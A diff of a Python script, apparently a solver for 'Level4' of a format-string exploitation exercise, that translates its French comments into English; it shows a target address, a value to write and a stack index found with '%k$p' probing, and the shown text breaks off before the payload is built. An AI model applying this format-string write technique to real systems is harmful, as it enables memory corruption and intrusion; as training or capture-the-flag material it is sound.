@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Level4: adresse de m + valeur 16930116 + index (ex. 12) → commande format string."""
+"""Level4: address of m + value 16930116 + index (e.g. 12) → format string command."""
 
 try:
     from pwn import p32
@@ -9,7 +9,7 @@ except ImportError:
 
 M_ADDR = 0x8049810
 VALUE = 16930116  # 0x1025544
-INDEX = 12  # trouvé avec AAAA + %k$p (adapter si autre VM)
+INDEX = 12  # found with AAAA + %k$p (adjust for another VM)
 
 def main():
     padding = VALUE - 4
